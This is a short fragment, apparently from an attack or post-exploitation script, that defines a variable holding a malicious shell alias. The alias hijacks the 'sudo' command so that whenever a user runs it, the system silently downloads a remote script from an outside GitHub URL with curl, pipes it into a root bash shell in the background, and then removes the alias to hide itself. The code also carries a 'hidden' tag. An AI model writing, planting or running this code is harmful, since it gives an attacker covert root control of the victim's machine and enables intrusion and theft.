...
SUDO_ALIAS='\n\\alias sudo="sudo bash -c "((nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/ib.sh 2> /dev/null&disown)|nohup sudo bash > /dev/null 2>&1 &disown)" && (unset -f nalias && unalias sudo && unalias alias) > /dev/null 2>&1 && sudo \\`#h1dD3N\\`"
